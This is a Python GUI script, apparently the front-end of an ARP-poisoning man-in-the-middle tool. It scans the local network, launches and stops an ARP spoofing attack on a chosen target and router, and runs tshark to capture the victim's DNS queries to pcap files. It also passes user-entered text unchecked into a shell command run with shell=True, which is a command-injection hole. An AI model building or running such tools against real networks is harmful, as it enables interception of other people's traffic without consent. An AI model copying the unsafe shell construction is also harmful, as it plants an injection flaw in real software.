import sys
import time 
import os

from attack import *
from PySide2.QtUiTools import QUiLoader
from PySide2.QtWidgets import QApplication, QPushButton, QLineEdit, QWidget, QTextBrowser
from PySide2.QtCore import QFile, QObject
 
class Form(QObject):
 
    def __init__(self, ui_file, parent=None):
        super(Form, self).__init__(parent)

        #Load and close GUI file
        ui_file = QFile(ui_file)
        ui_file.open(QFile.ReadOnly)
        loader = QUiLoader()
        self.window = loader.load(ui_file)
        ui_file.close()

        #UI components
        self.btn_scan_ntw = self.window.findChild(QPushButton, 'scanNetwork')
        self.btn_scan_ntw.clicked.connect(self.scan_handler)
        self.output_zone = self.window.findChild(QTextBrowser, 'outputZone')
        self.targetIP = self.window.findChild(QLineEdit, 'targetIP')
        self.targetMAC = self.window.findChild(QLineEdit, 'targetMAC')
        self.routerIP = self.window.findChild(QLineEdit, 'routerIP')
        self.btn_launch_attack = self.window.findChild(QPushButton, 'launchArpAttack')
        self.btn_launch_attack.clicked.connect(self.attack_handler)
        self.btn_stop_attack = self.window.findChild(QPushButton, 'stopArpAttack')
        self.btn_stop_attack.clicked.connect(self.stop_attack_handler)
        self.pid_tshark = None
        self.window.show()
 
    def scan_handler(self):
        output = launch_scanning_network()

        for i in range(len(output)):
            self.output_zone.append(output[i])

    def attack_handler(self):
        target_IP = 'None' if not self.targetIP.text() else self.targetIP.text()
        target_MAC = 'None' if not self.targetMAC.text() else self.targetMAC.text()
        router_IP = 'None' if not self.routerIP.text() else self.routerIP.text()

        if target_IP != 'None' and target_MAC != 'None' and router_IP != 'None':
            arp_mitm_attack(target_IP, target_MAC, router_IP)
        else:
            print('You need to fill parameters needed for the ARP Poisonning...')
            
        #Log all sniffed DNS queries
        cmd = 'tshark -f "src ' + str(target_IP) + ' and port 53 and not icmp" -w ./Sniffing_Logs/'+ str(int(time.time())) + '.pcap'
        sniffing_process = subprocess.Popen([cmd], shell=True, preexec_fn=os.setsid) 
        self.pid_tshark = sniffing_process.pid

    def stop_attack_handler(self):
        os.killpg(os.getpgid(self.pid_tshark), signal.SIGTERM)
        stop_attack()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    form = Form('GUI.ui')
    sys.exit(app.exec_())